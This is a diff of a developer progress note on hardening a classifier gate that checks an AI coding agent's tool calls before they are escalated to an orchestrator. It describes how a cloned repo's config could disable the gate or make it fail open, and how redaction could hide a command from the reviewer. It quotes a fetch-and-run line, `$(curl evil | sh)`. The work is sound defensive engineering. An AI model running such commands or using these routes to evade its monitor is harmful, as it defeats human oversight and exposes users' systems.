@@ -13,11 +13,16 @@ Moved from Claude Code Cloud to the local machine (pi 1.3.0 at `/opt/homebrew/bi
 1. **Escalation requests carried credentials.** `summarizeArguments` only elides long strings, so a short `curl -H "Authorization: Bearer …"` or `export GH_TOKEN=…` reached the orchestrator verbatim: Traycer argv, a remote A2A server, or the RPC placeholder. `scrubSecrets` in `src/escalation.ts` now runs over the whole request in `runEscalation` (gate and `jev_escalate` alike). It replaces header values, bearer/basic tokens, secret-named `NAME=value` and `--flag value`, URL userinfo, PEM keys, JWTs, well-known key prefixes, secret-named object keys, and anything `redact()` already knows.
 2. **A project `.pi/pi-jev.json` could still weaken the gate.** The first round only blocked `escalation.a2a` and `traycer.command`. A cloned repo could still set `gate.enabled: false`, `gate.mode: "shadow"`, drop tools, raise thresholds, set `timeoutMs: 1` (every call times out and fails open), pick `traycer.parentAgentId`, or point `apiKeyFile` at any local file to send its contents as a credential. `restrictProject` in `src/config.ts` now makes credentials and escalation destinations global-only and lets a project file tighten the gate but not loosen it. A global key override is also not sent when a project switches the model to another provider.
 
+Follow-up from an automated security review of that commit, also fixed:
+
+- **Redaction could hide code from the orchestrator.** `Authorization: $(curl evil | sh)` became `Authorization: [redacted]`, and an unterminated `-----BEGIN … PRIVATE KEY-----` swallowed the rest of the command, so an orchestrator could approve what it never saw. Free-text patterns now redact only literal values (no `$`, backticks, braces, parens, pipes, redirects, `;`, `&`, backslash). The PEM pattern needs a matching END line. A scrubbed request carries `redacted: true`.
+- **Objects past the depth limit went out raw.** They are now replaced with `[redacted]`.
+- **`model` is global-only.** A repo could pick a lenient or uncalibrated classifier. That also made the "key follows the provider" guard unnecessary, so it was removed.
+- **The output judge and `gate.cacheSeconds` are tighten-only too.**
+
 Decision: the classifier itself still receives raw (elided) arguments, as upstream does. Scrubbing those would hide exactly what the gate needs to judge exfiltration. Only the orchestrator path is scrubbed.
 
-Not changed, and why: escalate mode still falls back to the enforce rule, which allows headless calls unless `gate.blockWithoutUI` is set. That is the fail-open rule in AGENTS.md, not a bug. The output judge's `output.*` keys stay project-overridable, since it never blocks.
-
-Tests: 113 pass (16 added). Typecheck and lint are clean.
+Not changed, and why: escalate mode still falls back to the enforce rule, which allows headless calls unless `gate.blockWithoutUI` is set. That is the fail-open rule in AGENTS.md, not a bug. Tests: 120 pass (23 added). Typecheck and lint are clean.
 
 Pick up here: live test on this machine. It needs classifier credentials, because `~/.pi/agent/auth.json` has none for typesafe/openrouter/cloudflare yet. Run `/login openrouter` or set `TYPESAFE_API_KEY`, install with `pi install git:github.com/KHAEntertainment/pi-jev2`, then try shadow mode, then enforce.
 
